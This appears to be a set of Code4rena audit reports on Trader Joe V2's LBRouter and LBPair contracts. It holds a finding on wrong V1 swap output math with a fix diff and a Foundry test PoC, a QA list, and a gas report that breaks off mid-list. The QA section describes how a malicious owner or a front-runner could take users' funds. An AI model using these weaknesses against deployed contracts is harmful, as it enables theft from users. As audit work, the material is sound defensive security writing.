# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891 https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896   # Vulnerability details  ## Impact Output amount is calculated incorrectly for a Trader Joe V1 pool when swapping tokens across multiple pools and some of the pools in the chain are V1 ones. Calculated amounts will always be smaller than expected ones, which will always affect chained swaps that include V1 pools. ## Proof of Concept [LBRouter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L21) is a high-level contract that serves as the main contract users will interact with. The contract implements a lot of security checks and helper functions that make usage of LBPair contracts easier and more user-friendly. Some examples of such functions: - [swapExactTokensForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L531), which makes chained swaps (i.e. swaps between tokens that don't have a pair) of tokens implementing fee on transfer (i.e. there's fee reduced from every transferred amount); - [swapExactTokensForAVAXSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L561), which is the variation of the above function which takes AVAX as the output token; - [swapExactAVAXForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L594), which is the variation of the previous function which takes AVA as the input token.  Under the hood, these three functions call [_swapSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L864), which is the function that actually performs swaps. The function supports both Trader Joe V1 and V2 pools: when `_binStep` is 0 (which is never true in V2 pools), it's assumed that the current pool is a V1 one. For V1 pools, the function calculates output amounts based on pools' reserves and balances: ```solidity if (_binStep == 0) {     (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();     if (_token < _tokenNext) {         uint256 _balance = _token.balanceOf(_pair);         uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);          IJoePair(_pair).swap(0, _amountOut, _recipient, "");     } else {         uint256 _balance = _token.balanceOf(_pair);         uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);          IJoePair(_pair).swap(_amountOut, 0, _recipient, "");     } } else {     ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient); } ``` However, these calculations are incorrect. Here's the difference: ```diff @@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();                      if (_token < _tokenNext) {                          uint256 _balance = _token.balanceOf(_pair); -                        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000); +                        uint256 amountInWithFee = (_balance - _reserve0) * 997; +                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);                           IJoePair(_pair).swap(0, _amountOut, _recipient, "");                      } else {                          uint256 _balance = _token.balanceOf(_pair); -                        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000); +                        uint256 amountInWithFee = (_balance - _reserve1) * 997; +                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);                           IJoePair(_pair).swap(_amountOut, 0, _recipient, "");                      } ```  These calculations are implemented correctly in [JoeLibrary.getAmountOut](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/JoeLibrary.sol#L30-L41), which is used in [LBQuoter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L83).  Also it's used in Trader Joe V1 to calculate output amounts in similar functions: - https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375  ```solidity // test/audit/RouterMath2.t.sol // SPDX-License-Identifier: UNLICENSED  pragma solidity ^0.8.7;  import "../TestHelper.sol";  import "../../src/LBRouter.sol"; import "../../src/interfaces/IJoePair.sol";  contract RouterMath2Test is TestHelper {     IERC20 internal token;     uint256 internal actualAmountOut;      function setUp() public {         token = new ERC20MockDecimals(18);         ERC20MockDecimals(address(token)).mint(address(this), 100e18);          router = new LBRouter(             ILBFactory(address(0x00)),             IJoeFactory(address(this)),             IWAVAX(address(0x02))         );     }      // Imitates V1 factory.     function getPair(address, /*tokenX*/ address /*tokenY*/ ) public view returns (address) {         return address(this);     }      // Imitates V1 pool.     function getReserves() public pure returns (uint112, uint112, uint32) {         return (1e18, 1e18, 0);     }      // Imitates V1 pool.     function balanceOf(address /*acc*/) public pure returns (uint256) {         return 0.0001e18;     }      // Imitates V1 pool.     function swap(uint256 amount0, uint256 amount1, address to, bytes memory data) public {         actualAmountOut = amount0 == 0 ? amount1 : amount0;     }      function testScenario() public {         // Setting up a swap via one V1 pool.         uint256[] memory steps = new uint256[](1);         steps[0] = 0;          IERC20[] memory path = new IERC20[](2);         path[0] = IERC20(address(token));         path[1] = IERC20(address(this));          uint256 amountIn = 0.0001e18;          token.approve(address(router), 1e18);         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(             amountIn, 0, steps, path, address(this), block.timestamp + 1000         );         // This amount was calculated incorrectly.         assertEq(actualAmountOut, 987030000000000000); // Equals to 989970211528238869 when fixed.           address _pair = address(this);         uint256 expectedAmountOut;          // Reproduce the calculations using JoeLibrary.getAmountIn. This piece:         // https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L888-L899         (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();         if (address(token) < address(this)) {             uint256 _balance = token.balanceOf(_pair);             expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve0, _reserve0, _reserve1);         } else {             uint256 _balance = token.balanceOf(_pair);             expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve1, _reserve1, _reserve0);         }          // This is the correct amount.         assertEq(expectedAmountOut, 989970211528238869);          // The wrong amount is smaller than the expected one.         assertEq(expectedAmountOut - actualAmountOut, 2940211528238869);     } } ``` ## Tools Used Manual review. ## Recommended Mitigation Steps Consider using the `JoeLibrary.getAmountOut` function in the `_swapSupportingFeeOnTransferTokens` function of `LBRouter` when computing output amounts for V1 pools.
## Low & QA 1. Missing sanity checks on `to` addresses in `LBRouter.sol` 2. Rug vectors by the owner 3. All tokens send to a pair that are not immediately used can be stolen 4. Potential loss of funds on tokens with big supplies 5. In `TokenHelper.sol` the `safeTransfer` function does not check for potentially self-destroyed tokens   ### 1. Missing sanity checks on `to` addresses in `LBRouter.sol`  All the public/external functions in `LBRouter.sol` require an address `to` as a parameter to which to send either tokens, LBtokens or ETH. When tokens or LBtokens are sent the protocol should check that if the `to` address is contract then that contract should is able to manage `ERC20/LBTokens`, otherwise funds would be lost.  ### 2. Rug vectors by the owner  A malicious owner can call `setLBPairImplementation()`, `setFeeRecipient()`, `setFlashLoanFee()` , `setFeesParameters()` and `forceDecay()` to advantage himself at expenses of the users.  - `setLBPairImplementation()`: can be used to silently frontun a pair creation by swapping the implementation with a malicious one and stealing potentially any deposit. - `setFeeRecipient()`: can be used to steal all of the protocol fees not yet collected. - `setFlashLoanFee()`: can be used to frontrun a flashloan by increasing the fee, if the flashloan returns the fee based on the callback parameters. - `setFeesParameters()`: can set the protocol fee to the max 25% and gets the funds for himself in combination with `setFeeRecipient()`. - `forceDecay()`: can be used to advantage himself in trades.  As a mitigation add a timelock and make sure the owner is a multisig and not an EOA.  ### 3. All tokens send to a pair that are not immediately used can be stolen  If extra tokens are sent the a pair contract either by mistake or intentionally and they are not used immetiately (calling either `mint()`, `burn()` or `swap()`) they become available for anybody to frontrun and claim by simply calling `mint()` and `burn()`.  ### 4. Potential loss of funds on tokens with big supplies  `swap()` and `mint()` both reverts if either `2^112` or `2^128` tokens are sent to the pair. This would result in the funds being stuck and nobody being able to mint or swap. Submitting as low because the cost of attack is extremely high, but it's good to be aware of it.  ### 5. In `TokenHelper.sol` the `safeTransfer` function does not check for potentially self-destroyed tokens.  If a pair gets created and after a while one of the tokens gets self-destroyed (maybe because of a bug) then `safeTransfer` would still succeed. It's probably a good idea to check if the contract still exists by checking the bytecode length. 
## Summary  ### Gas Optimizations | |Issue|Instances|Total Gas Saved| |-|:-|:-:|:-:| | [G&#x2011;01] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 1 | - | | [G&#x2011;02] | State variables can be packed into fewer storage slots | 1 | - | | [G&#x2011;03] | Using `storage` instead of `memory` for structs/arrays saves gas | 11 | 46200 | | [G&#x2011;04] | Avoid contract existence checks by using low level calls | 28 | 2800 | | [G&#x2011;05] | Multiple accesses of a mapping/array should use a local variable cache | 1 | 42 | | [G&#x2011;06] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 5 | 425 | | [G&#x2011;07] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 5 | 300 | | [G&#x2011;08] | Optimize names to save gas | 11 | 242 | | [G&#x2011;09] | Use a more recent version of solidity | 37 | - | | [G&#x2011;10] | `>=` costs less gas than `>` | 1 | 3 | | [G&#x2011;11] | Functions guaranteed to revert when called by normal users can be marked `payable` | 20 | 420 |  Total: 121 instances over 11 issues with **50432 gas** saved  Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above and its gas values do not include any excluded findings.    ## Gas Optimizations  ### [G&#x2011;01]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There is 1 instance of this issue:* ```solidity File: src/LBPair.sol  68        mapping(address => bytes32) private _unclaimedFees; 69        /// @dev Mapping from account to id to user's accruedDebt. 70:       mapping(address => mapping(uint256 => Debts)) private _accruedDebts;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L68-L70  ### [G&#x2011;02]  State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There is 1 instance of this issue:* ```solidity File: src/LBFactory.sol  /// @audit Variable ordering with 8 slots instead of the current 9: ///           move bool(1):creationUnlocked to be right after address(20):feeRecipient 32:       address public override LBPairImplementation;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L32  ### [G&#x2011;03]  Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 11 instances of this issue:* ```solidity File: src/LBFactory.sol  197:                          LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][i];  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L197  ```solidity File: src/LBPair.sol  220:              FeeHelper.FeeParameters memory _fp = _feeParameters;  283:                      Bin memory _bin = _bins[_id];  310:          PairInformation memory _pair = _pairInformation;  318:          FeeHelper.FeeParameters memory _fp = _feeParameters;  327:              Bin memory _bin = _bins[_pair.activeId];  426:          FeeHelper.FeeParameters memory _fp = _feeParameters;  484:          PairInformation memory _pair = _pairInformation;  486:          FeeHelper.FeeParameters memory _fp = _feeParameters;  498:                  Bin memory _bin = _bins[_mintInfo.id];  706:                      Bin memory _bin = _bins[_id];  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L220   ### [G&#x2011;04]  Avoid contract existence checks by using low level calls Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence  *There are 28 instances of this issue:* ```solidity File: src/LBFactory.sol  /// @audit factory() 216:          if (ILBPair(_LBPairImplementation).factory() != this)  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L216  ```solidity File: src/LBQuoter.sol  /// @audit getPair() 77:               quote.pairs[i] = IJoeFactory(factoryV1).getPair(_route[i], _route[i + 1]);  /// @audit getAllLBPairs() 94:               ILBFactory.LBPairInformation[] memory LBPairsAvailable = ILBFactory(factoryV2).getAllLBPairs(  /// @audit getSwapOut() 105:                              ILBRouter(routerV2).getSwapOut(LBPairsAvailable[j].LBPair, quote.amounts[i], swapForY)  /// @audit getPair() 156:              quote.pairs[i - 1] = IJoeFactory(factoryV1).getPair(_route[i - 1], _route[i]);  /// @audit getAllLBPairs() 171:              ILBFactory.LBPairInformation[] memory LBPairsAvailable = ILBFactory(factoryV2).getAllLBPairs(  /// @audit getSwapIn() 181:                              ILBRouter(routerV2).getSwapIn(LBPairsAvailable[j].LBPair, quote.amounts[i], swapForY)  /// @audit getReserves() 223:          (uint256 reserve0, uint256 reserve1, ) = IJoePair(_pair).getReserves();  /// @audit mulShiftRoundDown() 240:              quote = BinHelper.getPriceFromId(_activeId, _binStep).mulShiftRoundDown(_amount, Constants.SCALE_OFFSET);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L77  ```solidity File: src/LBRouter.sol  /// @audit getReserves() 718:                  (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();  /// @audit tokenX() 727:                  (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);  /// @audit getReserves() 788:                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();  /// @audit swap() 792:                          IJoePair(_pair).swap(0, amountOut, _recipient, "");  /// @audit swap() 795:                          IJoePair(_pair).swap(amountOut, 0, _recipient, "");  /// @audit tokenY() 798:                      bool _swapForY = _tokenNext == ILBPair(_pair).tokenY();  /// @audit swap() 800:                      (uint256 _amountXOut, uint256 _amountYOut) = ILBPair(_pair).swap(_swapForY, _recipient);  /// @audit swap() 843:                          IJoePair(_pair).swap(0, amountOut, _recipient, "");  /// @audit swap() 845:                          IJoePair(_pair).swap(amountOut, 0, _recipient, "");  /// @audit tokenY() 848:                      bool _swapForY = _tokenNext == ILBPair(_pair).tokenY();  /// @audit swap() 850:                      (uint256 _amountXOut, uint256 _amountYOut) = ILBPair(_pair).swap(_swapForY, _recipient);  /// @audit getReserves() 888:                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();  /// @audit swap() 893:                          IJoePair(_pair).swap(0, _amountOut, _recipient, "");  /// @audit swap() 898:                          IJoePair(_pair).swap(_amountOut, 0, _recipient, "");  /// @audit swap() /// @audit tokenY() 901:                      ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L718  ```solidity File: src/libraries/BinHelper.sol  /// @audit power() 44:               return _getBPValue(_binStep).power(_realId);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/BinHelper.sol#L44  ```solidity File: src/libraries/TokenHelper.sol  /// @audit call() 28:               (bool success, bytes memory result) = address(token).call(  /// @audit call() 46:               (bool success, bytes memory result) = address(token).call(  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/TokenHelper.sol#L28  ```diff diff --git a/src/LBFactory.sol b/src/LBFactory.sol index 32ee39c..df9d1c7 100644 --- a/src/LBFactory.sol +++ b/src/LBFactory.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/proxy/Clones.sol";  import "openzeppelin/utils/structs/EnumerableSet.sol"; diff --git a/src/LBQuoter.sol b/src/LBQuoter.sol index 53fdf0c..e9f9815 100644 --- a/src/LBQuoter.sol +++ b/src/LBQuoter.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "./LBErrors.sol";  import "./libraries/BinHelper.sol"; diff --git a/src/LBRouter.sol b/src/LBRouter.sol index 567c49a..532cc13 100644 --- a/src/LBRouter.sol +++ b/src/LBRouter.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/IERC20.sol";   diff --git a/src/libraries/BinHelper.sol b/src/libraries/BinHelper.sol index db0fef8..c6cf99c 100644 --- a/src/libraries/BinHelper.sol +++ b/src/libraries/BinHelper.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "../LBErrors.sol";  import "./Math128x128.sol"; diff --git a/src/libraries/TokenHelper.sol b/src/libraries/TokenHelper.sol index 17d8e23..3391a98 100644 --- a/src/libraries/TokenHelper.sol +++ b/src/libraries/TokenHelper.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/IERC20.sol";   diff --git a/test/LBPair.t.sol b/test/LBPair.t.sol index d84bb5b..550d55a 100644 --- a/test/LBPair.t.sol +++ b/test/LBPair.t.sol @@ -1,5 +1,5 @@  // SPDX-License-Identifier: UNLICENSED -pragma solidity 0.8.7; +pragma solidity 0.8.10;    import "./TestHelper.sol";   diff --git a/test/mocks/ERC20.sol b/test/mocks/ERC20.sol index 0543ab8..4cabd37 100644 --- a/test/mocks/ERC20.sol +++ b/test/mocks/ERC20.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";   diff --git a/test/mocks/ERC20MockDecimals.sol b/test/mocks/ERC20MockDecimals.sol index b952b88..95d1797 100644 --- a/test/mocks/ERC20MockDecimals.sol +++ b/test/mocks/ERC20MockDecimals.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";   diff --git a/test/mocks/ERC20MockDecimalsOwnable.sol b/test/mocks/ERC20MockDecimalsOwnable.sol index 081940f..7ca3b95 100644 --- a/test/mocks/ERC20MockDecimalsOwnable.sol +++ b/test/mocks/ERC20MockDecimalsOwnable.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";  import "openzeppelin/access/Ownable.sol"; diff --git a/test/mocks/ERC20WithTransferTax.sol b/test/mocks/ERC20WithTransferTax.sol index 7a7a1f4..269616d 100644 --- a/test/mocks/ERC20WithTransferTax.sol +++ b/test/mocks/ERC20WithTransferTax.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";   diff --git a/test/mocks/Faucet.sol b/test/mocks/Faucet.sol index 108bde7..e00e8fd 100644 --- a/test/mocks/Faucet.sol +++ b/test/mocks/Faucet.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "../../src/libraries/PendingOwnable.sol";  import "../../src/libraries/TokenHelper.sol"; diff --git a/test/mocks/FlashloanBorrower.sol b/test/mocks/FlashloanBorrower.sol index 16817a8..2bfe335 100644 --- a/test/mocks/FlashloanBorrower.sol +++ b/test/mocks/FlashloanBorrower.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/interfaces/IERC20.sol";   diff --git a/test/mocks/WAVAX.sol b/test/mocks/WAVAX.sol index fd86df0..0ff59a0 100644 --- a/test/mocks/WAVAX.sol +++ b/test/mocks/WAVAX.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";   ```  ```diff diff --git a/tmp/gas_before b/tmp/gas_after index f6d4cb0..3e4d40b 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -5,3 +5,3 @@   - 2086657                               10631                                             + 2083650                               10616                                               @@ -59,3 +59,3 @@   - setLBPairImplementation               1524             24536   25108   25108   147      + setLBPairImplementation               1396             24408   24980   24980   147        @@ -68,3 +68,3 @@   - 4835641                         24410                                                 + 4823808                         24344                                                   @@ -74,9 +74,9 @@   - balanceOfBatch                  3766             7101     5769     11769     3        + balanceOfBatch                  3513             6936     5648     11648     3          - burn                            11235            111199   107074   244666    14       + burn                            11185            111009   106900   244223    14         - collectFees                     6720             27696    20481    44969     7        + collectFees                     6659             27637    20420    44908     7          - collectProtocolFees             5620             8817     9349     10952     4        + collectProtocolFees             5517             8708     9247     10824     4          @@ -88,3 +88,3 @@   - flashLoan                       24674            55799    24674    118050    3        + flashLoan                       24546            55415    24546    117154    3          @@ -108,3 +108,3 @@   - mint                            6892             1402686  1389693  14398451  216      + mint                            6889             1401974  1389110  14394628  216        @@ -112,5 +112,5 @@   - pendingFees                     4041             12049    12853    22185     8        + pendingFees                     3980             11987    12792    22076     8          - safeBatchTransferFrom           3251             408394   319740   1394600   25       + safeBatchTransferFrom           2997             408204   319642   1394156   25         @@ -122,3 +122,3 @@   - swap                            22475            50419    30217    341090    318      + swap                            22347            50291    30089    340962    318        @@ -141,3 +141,3 @@   - 1899867                             9873                                            + 1862779                             9669                                              @@ -149,5 +149,5 @@   - findBestPathFromAmountIn            1033             45266  45438   88927  5        + findBestPathFromAmountIn            1021             44110  44256   86575  5          - findBestPathFromAmountOut           1011             38128  40133   68750  5        + findBestPathFromAmountOut           999              37100  39335   66782  5          @@ -160,3 +160,3 @@   - 4591267                                                23440                                                + 4464246                                                22787                                                  @@ -164,7 +164,7 @@   - addLiquidity                                           19672            1271036  1387744  3343198  132      + addLiquidity                                           19104            1269581  1386214  3340492  132        - addLiquidityAVAX                                       20036            1466238  1443921  3391536  41       + addLiquidityAVAX                                       19453            1464700  1442391  3388830  41         - createLBPair                                           279323           311452   317427   331632   4        + createLBPair                                           279195           311324   317299   331504   4          @@ -174,9 +174,9 @@   - getIdFromPrice                                         19069            28334    32951    32983    3        + getIdFromPrice                                         18941            28206    32823    32855    3          - getPriceFromId                                         4771             5491     5834     5868     3        + getPriceFromId                                         4643             5363     5706     5740     3          - getSwapIn                                              1980             18959    11151    61718    30       + getSwapIn                                              1852             18336    10767    59542    30         - getSwapOut                                             12368            19836    21752    28264    20       + getSwapOut                                             11984            19375    21112    27368    20         @@ -184,27 +184,27 @@   - removeLiquidity                                        2118             579712   408504   1623758  10       + removeLiquidity                                        2068             578983   407904   1622121  10         - removeLiquidityAVAX                                    1941             976395   1115696  1672247  4        + removeLiquidityAVAX                                    1891             975385   1114521  1670610  4          - swapAVAXForExactTokens                                 1534             28653    8550     166467   8        + swapAVAXForExactTokens                                 1520             28333    8348     165405   8          - swapExactAVAXForTokens                                 1578             51884    15354    153614   8        + swapExactAVAXForTokens                                 1564             51591    15036    153064   8          - swapExactAVAXForTokensSupportingFeeOnTransferTokens    1556             51177    14867    163525   9        + swapExactAVAXForTokensSupportingFeeOnTransferTokens    1542             50810    14549    162719   9          - swapExactTokensForAVAX                                 1630             69984    15522    286316   10       + swapExactTokensForAVAX                                 1616             69659    15204    285230   10         - swapExactTokensForAVAXSupportingFeeOnTransferTokens    1610             56192    15502    167467   10       + swapExactTokensForAVAXSupportingFeeOnTransferTokens    1596             55786    15184    166822   10         - swapExactTokensForTokens                               1631             105125   67133    538137   13       + swapExactTokensForTokens                               1617             104587   66693    535979   13         - swapExactTokensForTokensSupportingFeeOnTransferTokens  1610             55076    45689    136771   10       + swapExactTokensForTokensSupportingFeeOnTransferTokens  1596             54621    45207    135965   10         - swapTokensForExactAVAX                                 1588             29596    8610     173651   8        + swapTokensForExactAVAX                                 1574             29302    8408     172801   8          - swapTokensForExactTokens                               1632             127782   24140    609504   11       + swapTokensForExactTokens                               1618             126636   23462    605298   11         - sweep                                                  6028             26141    26740    36036    5        + sweep                                                  5900             26003    26535    35908    5          - sweepLBToken                                           3264             156904   156904   310544   2        + sweepLBToken                                           3014             156630   156630   310247   2          @@ -217,3 +217,3 @@   - 19179229                                                       95589                                       + 18854334                                                       93969                                         @@ -228,3 +228,3 @@   - 17699454                                                       88210                                       + 17397071                                                       86702                                         @@ -249,3 +249,3 @@   - transfer                                                     2581             10121  3226    29926  527      + transfer                                                     2581             10093  3226    29926  526        @@ -258,3 +258,3 @@   - 693730                                                                     4198                                            + 693718                                                                     4161                                              @@ -292,3 +292,3 @@   - 1098332                                5556                                             + 1095325                                5541                                               @@ -306,5 +306,5 @@   - request()                              340              73455  101517  137977  12       + request()                              340              73284  101261  137721  12         - request(address)                       622              64004  58354   138687  4        + request(address)                       622              63876  58226   138431  4          @@ -327,3 +327,3 @@   - 413779                                                   2134                                             + 401767                                                   2074                                               @@ -331,7 +331,7 @@   - LBFlashLoanCallback                                      12455            12455  12455   12455   1        + LBFlashLoanCallback                                      11943            11943  11943   11943   1          - flashBorrow                                              33471            77648  77648   121826  2        + flashBorrow                                              33343            77136  77136   120930  2          - flashBorrowWithReentrancy                                33427            33427  33427   33427   1        + flashBorrowWithReentrancy                                33299            33299  33299   33299   1          ```  ``` testInversePriceForOppositeBins() (gas: 0 (0.000%))  testRevertOnNonEOA() (gas: 0 (0.000%))  testForInvalidReductionFactor() (gas: 0 (0.000%))  testSetFeeRecipientNotByOwnerReverts() (gas: 0 (0.000%))  testsetFactoryLockedState() (gas: 0 (0.000%))  testSelfApprovalReverts() (gas: 0 (0.000%))  testInternalApproval() (gas: 0 (0.000%))  testInternalBurn(uint256,uint256) (gas: 0 (0.000%))  testInternalBurnFrom0AddressReverts() (gas: 0 (0.000%))  testInternalExcessiveBurnAmountReverts(uint128,uint128) (gas: 0 (0.000%))  testInternalMint(uint256) (gas: 0 (0.000%))  testInternalMintTo0AddressReverts() (gas: 0 (0.000%))  testAddToken() (gas: -19 (-0.002%))  testForInvalidFeeRecipient() (gas: -7 (-0.010%))  testIncreaseOracleLength() (gas: -256 (-0.012%))  testSetFeesParametersOnPairReverts() (gas: -128 (-0.036%))  testForDoubleIgnored() (gas: -128 (-0.036%))  testForInvalidBaseFactor() (gas: -128 (-0.036%))  testForInvalidFilterPeriod() (gas: -128 (-0.036%))  testCreatePairWhenFactoryIsUnlocked() (gas: -262 (-0.070%))  testSetFeesParametersOnPair() (gas: -256 (-0.071%))  testTLowerThanTimestamp() (gas: -5524 (-0.072%))  testIfPairAlreadyExistsReverts() (gas: -256 (-0.073%))  testGetSwapOutWithMultipleChoices() (gas: -3684 (-0.090%))  testForceDecay() (gas: -8084 (-0.101%))  testFuzzingAddLiquidity(uint256) (gas: -1066 (-0.103%))  testForInvalidProtocolShare() (gas: -384 (-0.109%))  testSwapXtoYDistantBinsFromGetSwapOut() (gas: -1970 (-0.112%))  testFlashloan() (gas: -1953 (-0.113%))  testInsufficientLiquidityMinted() (gas: -1876 (-0.114%))  testSwapXtoYConsecutiveBinFromGetSwapOut() (gas: -1970 (-0.115%))  testSwapYtoXConsecutiveBinFromGetSwapOut() (gas: -1970 (-0.116%))  testBurnLiquidity() (gas: -2272 (-0.120%))  testSwapXtoYDistantBinsFromGetSwapIn() (gas: -2098 (-0.120%))  testSwapXtoYConsecutiveBinFromGetSwapIn() (gas: -2098 (-0.123%))  testSwapYtoXConsecutiveBinFromGetSwapIn() (gas: -2098 (-0.123%))  testSwapYtoXDistantBinsFromGetSwapOut() (gas: -2226 (-0.125%))  testOracleSampleFromWith100SamplesNotAllInitialized() (gas: -24340 (-0.125%))  testSwapYtoXDistantBinsFromGetSwapIn() (gas: -2354 (-0.132%))  testTaxTokenSwappedOnV1Pairs() (gas: -6516 (-0.134%))  testFailFlashloanMoreThanReserves() (gas: -128 (-0.141%))  testFailFlashlaonWithReentrancy() (gas: -128 (-0.142%))  testFlawedCompositionFactor() (gas: -2724 (-0.162%))  testLockRequest() (gas: -256 (-0.162%))  testSafeBatchTransferFrom() (gas: -2642 (-0.167%))  testSafeTransferNotApprovedReverts() (gas: -1906 (-0.182%))  testEnsureModifierLiquidity() (gas: -1549 (-0.183%))  testAddLiquidityTaxToken() (gas: -6640 (-0.185%))  testForAmountSlippageCaughtReverts() (gas: -4296 (-0.193%))  testSafeBatchTransferNotApprovedReverts() (gas: -2028 (-0.193%))  testGetIdFromPrice() (gas: -896 